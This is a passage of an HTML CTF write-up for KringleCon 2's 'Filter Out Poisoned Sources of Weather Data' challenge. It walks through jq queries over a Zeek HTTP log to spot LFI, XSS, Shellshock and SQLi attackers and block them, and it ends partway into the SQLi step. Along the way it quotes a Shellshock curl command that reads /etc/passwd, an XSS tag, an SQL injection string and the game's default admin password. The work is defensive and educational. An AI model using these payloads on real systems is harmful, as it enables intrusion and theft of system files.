@@ -1,0 +1,1582 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="Kringlecon2 CTF Writeup">
+      
+      
+      
+        <meta name="author" content="Salaheldinaz">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+    
+    
+      
+        <title>12 Filter Out Poisoned Sources of Weather Data - The Turtle Dove</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#e91e63">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,400i,700%7CUbuntu+Mono&display=fallback">
+        <style>body,input{font-family:"Ubuntu","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Ubuntu Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/asciinema-player.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="pink" data-md-color-accent="grey">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#12-filter-out-poisoned-sources-of-weather-data" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="The Turtle Dove" class="md-header-nav__button md-logo">
+          
+            <img src="../../images/logo.png" width="24" height="24">
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              The Turtle Dove
+            </span>
+            <span class="md-header-nav__topic">
+              
+                12  Filter Out Poisoned Sources of Weather Data
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="The Turtle Dove" class="md-nav__button md-logo">
+      
+        <img src="../../images/logo.png" width="48" height="48">
+      
+    </a>
+    The Turtle Dove
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Objectives
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Objectives
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective0/" title="0 Talk to Santa in the Quad" class="md-nav__link">
+      0 Talk to Santa in the Quad
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective1/" title="1 Find the Turtle Doves" class="md-nav__link">
+      1 Find the Turtle Doves
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective2/" title="2 Unredact Threatening Document" class="md-nav__link">
+      2 Unredact Threatening Document
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective3/" title="3 Windows Log Analysis - Evaluate Attack Outcome" class="md-nav__link">
+      3 Windows Log Analysis - Evaluate Attack Outcome
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective4/" title="4 Windows Log Analysis - Determine Attacker Technique" class="md-nav__link">
+      4 Windows Log Analysis - Determine Attacker Technique
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective5/" title="5 Windows Log Analysis - Determine Compromised System" class="md-nav__link">
+      5 Windows Log Analysis - Determine Compromised System
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective6/" title="6 Splnuk" class="md-nav__link">
+      6 Splnuk
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective7/" title="7 Get Access To The Steam Tunnels" class="md-nav__link">
+      7 Get Access To The Steam Tunnels
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective8/" title="8 Bypassing the Frido Sleigh CAPTEHA" class="md-nav__link">
+      8 Bypassing the Frido Sleigh CAPTEHA
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective9/" title="9 Retrieve Scraps of Paper from Server" class="md-nav__link">
+      9 Retrieve Scraps of Paper from Server
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective10/" title="10 Recover Cleartext Document" class="md-nav__link">
+      10  Recover Cleartext Document
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../objective11/" title="11 Open the Sleigh Shop Door" class="md-nav__link">
+      11  Open the Sleigh Shop Door
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        12  Filter Out Poisoned Sources of Weather Data
+      </label>
+    
+    <a href="./" title="12 Filter Out Poisoned Sources of Weather Data" class="md-nav__link md-nav__link--active">
+      12  Filter Out Poisoned Sources of Weather Data
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#info-hints" class="md-nav__link">
+    📜 Info &amp; Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    ⚡️ Solution
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#getting-the-logins-to-the-srf-portal" class="md-nav__link">
+    Getting the logins to the SRF portal
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#understanding-the-api-the-logs" class="md-nav__link">
+    Understanding the API &amp; the logs
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#searching-for-attacks" class="md-nav__link">
+    Searching for attacks
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pivoting-on-suspicious-useragents-of-detected-ips" class="md-nav__link">
+    Pivoting on suspicious UserAgents of detected ips
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blocking-the-malicious-ips" class="md-nav__link">
+    Blocking the malicious ips
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-youve-learned" class="md-nav__link">
+    🎓 What you've learned
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Helping the elves
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Helping the elves
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge1/" title="Escape Ed" class="md-nav__link">
+      Escape Ed
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge2/" title="Linux Path" class="md-nav__link">
+      Linux Path
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge3/" title="Xmas laser cheers" class="md-nav__link">
+      Xmas laser cheers
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge4/" title="Splunk - The training questions" class="md-nav__link">
+      Splunk - The training questions
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge5/" title="Mongo Pilfer" class="md-nav__link">
+      Mongo Pilfer
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge6/" title="Nyanshell" class="md-nav__link">
+      Nyanshell
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge7/" title="Frosty Keypad" class="md-nav__link">
+      Frosty Keypad
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge8/" title="Holiday Hack trail" class="md-nav__link">
+      Holiday Hack trail
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge9/" title="Key Bitting" class="md-nav__link">
+      Key Bitting
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge10/" title="Graylog" class="md-nav__link">
+      Graylog
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge11/" title="Smart Braces" class="md-nav__link">
+      Smart Braces
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../helptheelves/challenge12/" title="Zeek JSON Analysis" class="md-nav__link">
+      Zeek JSON Analysis
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/" title="Terminals & Portals" class="md-nav__link">
+      Terminals & Portals
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#info-hints" class="md-nav__link">
+    📜 Info &amp; Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    ⚡️ Solution
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#getting-the-logins-to-the-srf-portal" class="md-nav__link">
+    Getting the logins to the SRF portal
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#understanding-the-api-the-logs" class="md-nav__link">
+    Understanding the API &amp; the logs
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#searching-for-attacks" class="md-nav__link">
+    Searching for attacks
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pivoting-on-suspicious-useragents-of-detected-ips" class="md-nav__link">
+    Pivoting on suspicious UserAgents of detected ips
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blocking-the-malicious-ips" class="md-nav__link">
+    Blocking the malicious ips
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-youve-learned" class="md-nav__link">
+    🎓 What you've learned
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="12-filter-out-poisoned-sources-of-weather-data">12. <strong>Filter Out Poisoned Sources of Weather Data</strong><a class="headerlink" href="#12-filter-out-poisoned-sources-of-weather-data" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>Difficulty: 🎄🎄🎄🎄</p>
+</blockquote>
+<p><img alt="obj12-t" src="../images/obj12/t.png" /></p>
+<h2 id="info-hints">📜 Info &amp; Hints<a class="headerlink" href="#info-hints" title="Permanent link">&para;</a></h2>
+<div class="admonition info">
+<p class="admonition-title">Filter Out Poisoned Sources of Weather Data</p>
+<p>Use the data supplied in the <a href="https://downloads.elfu.org/http.log.gz">Zeek JSON logs</a> to identify the IP addresses of attackers poisoning Santa's flight mapping software.<br>
+<a href="https://srf.elfu.org/">Block the 100 offending sources of information</a> to guide Santa's sleigh through the attack.<br>
+Submit the Route ID ("RID") success value that you're given.</p>
+<p>For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.</p>
+</div>
+<div class="admonition quote">
+<p class="admonition-title">🧝🏻‍♂️ Wunorse Openslae</p>
+<p>Hey, you know what? We've got a crisis here.</p>
+<p>You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data.</p>
+<p>All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data!</p>
+<p>I'm so flummoxed I can't even remember how to login!</p>
+<p>Hmm... Maybe the Zeek <code>http.log</code> could help us.</p>
+<p>I worry about <code>LFI</code>, <code>XSS</code>, and <code>SQLi</code> in the Zeek log - oh my!</p>
+<p>And I'd be shocked if there weren't some shell stuff in there too.</p>
+<p>I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.</p>
+<p>If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.</p>
+<p>The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.</p>
+<p>Try not to block many legitimate weather station IPs as that could also cause route calculation failure.</p>
+<p>Remember, when looking at JSON data, <code>jq</code> is the tool for you!</p>
+</div>
+<div class="admonition hint">
+<p class="admonition-title">Finding Bad in Web Logs</p>
+<p>Do you see any <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">LFI</a>, <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS</a>, <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a>, or <a href="https://www.owasp.org/index.php/SQL_Injection">SQLi</a>?</p>
+</div>
+<details class="quote"><summary>🧚🏻‍‍ The Tooth Fairy</summary><p>I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday season.</p>
+<p>I hate how Santa is so beloved, but only works one day per year!</p>
+<p>He has all of the resources of the North Pole and the elves to help him too.</p>
+<p>I run a solo operation, toiling year-round collecting deciduous bicuspids and more from children.</p>
+<p>But I get nowhere near the gratitude that Santa gets. He needs to share his holiday resources with the rest of us!</p>
+<p>But, although you found me, you haven’t foiled my plot!</p>
+<p>Santa’s sleigh will NOT be able to find its way.</p>
+<p>I will get my revenge and respect!</p>
+<p>I want my own holiday, National Tooth Fairy Day, to be the most popular holiday on the calendar!!!</p>
+</details>
+<details class="quote"><summary>🧝🏻‍♂️ Krampus</summary><p>But there’s still time! Solve the final challenge in your badge by blocking the bad IPs at srf.elfu.org and save the holiday season!</p>
+</details>
+<div class="admonition info">
+<p class="admonition-title">Block the 100 offending sources of information &amp; Submit ("RID") success value</p>
+</div>
+<hr />
+<h2 id="solution">⚡️ Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
+<h3 id="getting-the-logins-to-the-srf-portal">Getting the logins to the SRF portal<a class="headerlink" href="#getting-the-logins-to-the-srf-portal" title="Permanent link">&para;</a></h3>
+<p>As we know from objective #10 :
+<img alt="obj12-2" src="../images/obj12/2.png" /></p>
+<p>The default login credentials should be changed on startup and can be found in the <code>readme</code> in the ElfU Research Labs git repository. Any git repository start with <code>README.md</code> we can test at the url directly.</p>
+<p>or we can search the logs for event without status_code <code>404</code> which means not found
+<div class="codehilite"><pre><span></span>cat http.log | jq &#39;.[] |  select((.uri | contains(&quot;README&quot;)) and (.status_code != 404)) | .uri &#39;
+</pre></div></p>
+<p>Grab it from the portal:
+<a href="https://srf.elfu.org/README.md">https://srf.elfu.org/README.md</a></p>
+<div class="codehilite"><pre><span></span><span class="gh">#</span> Sled-O-Matic - Sleigh Route Finder Web API
+
+<span class="gu">###</span> Installation
+
+<span class="sb">`sudo apt install python3-pip`</span>
+<span class="sb">`sudo python3 -m pip install -r requirements.txt`</span>
+
+
+<span class="gu">####</span> Running:
+
+<span class="sb">`python3 ./srfweb.py`</span>
+
+<span class="gu">####</span> Logging in:
+
+You can login using the default admin pass:
+
+<span class="sb">`admin 924158F9522B3744F5FCD4D10FAC4356`</span>
+
+However, it&#39;s recommended to change this in the sqlite db to something custom.
+</pre></div>
+
+<hr />
+<h3 id="understanding-the-api-the-logs">Understanding the API &amp; the logs<a class="headerlink" href="#understanding-the-api-the-logs" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>Log to the SRF portal using the credentials we found:</p>
+<p>username: <code>admin</code><br>
+password: <code>924158F9522B3744F5FCD4D10FAC4356</code></p>
+<details class="note"><summary>The SLEIGH ROUTE FINDER API portal</summary><p><img alt="obj12-1" src="../images/obj12/1.png" /></p>
+</details>
+</li>
+<li>
+<p>Open the <a href="https://srf.elfu.org/apidocs.pdf">API Docs</a></p>
+<div class="codehilite"><pre><span></span>To Update The Measurements For a Specific Global Elf Weather Station:
+
+HTTP POST REQUEST TO -http://srf.elfu.org/api/measurements
+
+HTTP HEADER OF-Content-Type: application/json
+
+API Request All StationIDS:
+HTTP GET REQUEST -http://srf.elfu.org/api/stationsAPI
+
+Request All Stations Weather Data:
+HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=*
+
+API Request One Stations Weather Data:
+HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=abcd1234API Request
+
+Multiple Specific StationsWeatherData:
+HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=abcd1234,abcd1235  
+</pre></div>
+
+<p>It's important to understand the correct url/requests for api.</p>
+</li>
+<li>
+<p>Look at first entry structure:<sup id="fnref2:3"><a class="footnote-ref" href="#fn:3">3</a></sup> to understand the content of each object in the logs.<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup></p>
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[0]&#39;</span>
+</pre></div>
+
+<div class="codehilite"><pre><span></span><span class="p">{</span>
+  <span class="nt">&quot;ts&quot;</span><span class="p">:</span> <span class="s2">&quot;2019-10-05T06:50:42-0800&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;uid&quot;</span><span class="p">:</span> <span class="s2">&quot;ClRV8h1vYKWXN1G5ke&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;id.orig_h&quot;</span><span class="p">:</span> <span class="s2">&quot;238.27.231.56&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;id.orig_p&quot;</span><span class="p">:</span> <span class="mi">60677</span><span class="p">,</span>
+  <span class="nt">&quot;id.resp_h&quot;</span><span class="p">:</span> <span class="s2">&quot;10.20.3.80&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;id.resp_p&quot;</span><span class="p">:</span> <span class="mi">80</span><span class="p">,</span>
+  <span class="nt">&quot;trans_depth&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="nt">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span>
+<span class="hll">  <span class="nt">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;srf.elfu.org&quot;</span><span class="p">,</span>
+</span><span class="hll">  <span class="nt">&quot;uri&quot;</span><span class="p">:</span> <span class="s2">&quot;/14.10/Google/&quot;</span><span class="p">,</span>
+</span>  <span class="nt">&quot;referrer&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;version&quot;</span><span class="p">:</span> <span class="s2">&quot;1.0&quot;</span><span class="p">,</span>
+<span class="hll">  <span class="nt">&quot;user_agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)&quot;</span><span class="p">,</span>
+</span>  <span class="nt">&quot;origin&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;request_body_len&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="nt">&quot;response_body_len&quot;</span><span class="p">:</span> <span class="mi">232</span><span class="p">,</span>
+  <span class="nt">&quot;status_code&quot;</span><span class="p">:</span> <span class="mi">404</span><span class="p">,</span>
+<span class="hll">  <span class="nt">&quot;status_msg&quot;</span><span class="p">:</span> <span class="s2">&quot;Not Found&quot;</span><span class="p">,</span>
+</span>  <span class="nt">&quot;info_code&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;info_msg&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;tags&quot;</span><span class="p">:</span> <span class="s2">&quot;(empty)&quot;</span><span class="p">,</span>
+<span class="hll">  <span class="nt">&quot;username&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+</span>  <span class="nt">&quot;password&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;proxied&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;orig_fuids&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;orig_filenames&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;orig_mime_types&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;resp_fuids&quot;</span><span class="p">:</span> <span class="s2">&quot;FUPWLQXTNsTNvf33&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;resp_filenames&quot;</span><span class="p">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;resp_mime_types&quot;</span><span class="p">:</span> <span class="s2">&quot;text/html&quot;</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>We have interesting parameters <code>host</code>, <code>uri</code>, <code>user_agent</code>, <code>status_code</code>,<code>username</code>.</p>
+<p>and we can search for unique values in each, for example:
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq  <span class="s1">&#39;.[] |  .username &#39;</span>  <span class="p">|</span> sort <span class="p">|</span> uniq
+</pre></div></p>
+<div class="codehilite"><pre><span></span>&quot;&#39; or &#39;1=1&quot;
+&quot;(empty)&quot;
+&quot;-&quot;
+&quot;-r nessus&quot;
+&quot;6666&quot;
+&quot;Admin&quot;
+&quot;admin&quot;
+&quot;comcomcom&quot;
+&quot;q1ki9&quot;
+&quot;root&quot;
+&quot;servlet&quot;
+&quot;support&quot;
+</pre></div>
+
+<p>This well help us searching and pivoting for each attack in the next step.</p>
+</li>
+</ol>
+<hr />
+<h3 id="searching-for-attacks">Searching for attacks<a class="headerlink" href="#searching-for-attacks" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>Local File Inclusion (LFI):
+    The File Inclusion vulnerability allows an attacker to include a file, that are already locally present on the server. And it's occurs when paths passed to "include" statements are not properly sanitized.<sup id="fnref3:2"><a class="footnote-ref" href="#fn:2">2</a></sup></p>
+<p>Typical proof-of-concept would be to load <code>passwd</code> file.</p>
+<p>So we will to search for <code>..</code>, <code>/etc</code>, <code>||</code>, <code>pass</code> in <code>uri</code>.</p>
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .uri | contains(&quot;..&quot;,&quot;/etc&quot;,&quot;||&quot;,&quot;pass&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+<blockquote>
+<p><code>.["id.orig_h"]</code> return source ip
+<code>sort</code> sort result
+<code>uniq</code> remove duplicates
+<code>&amp;&gt;&gt; detected_ips.csv</code> add result to csv file</p>
+</blockquote>
+</li>
+<li>
+<p>Cross-Site Scripting (XSS):
+    Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.</p>
+<p>Since the XSS attacks may be conducted without using <code>&lt;script&gt;&lt;/script&gt;</code> tags. Other tags will do exactly the same thing:<sup id="fnref2:2"><a class="footnote-ref" href="#fn:2">2</a></sup>
+<div class="codehilite"><pre><span></span>&lt;body onload=alert(&#39;test1&#39;)&gt;
+</pre></div></p>
+<p>So we will to search for <code>&lt;</code> in <code>uri</code> and <code>host</code>.</p>
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .uri | contains(&quot;&lt;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .host | contains(&quot;&lt;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+</li>
+<li>
+<p>Shellshock:
+    Shellshock is a family of security bugs[2] in the Unix Bash shell<sup id="fnref:3"><a class="footnote-ref" href="#fn:3">3</a></sup>, that use the User-Agent string to attack.</p>
+<p>Example of Execution
+<div class="codehilite"><pre><span></span>curl -A <span class="s1">&#39;() { :;}; echo &quot;Content-Type: text/plain&quot;; echo; /bin/cat /etc/passwd&#39;</span> http://192.168.1.14/cgi-bin/status &gt; passwd
+</pre></div></p>
+<p>So we will to search for the string <code>() { :; };</code> in <code>uri</code>, <code>host</code>, <code>user_agent</code></p>
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .user_agent | contains(&quot;() { :; };&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+</li>
+<li>
+<p>SQLi:
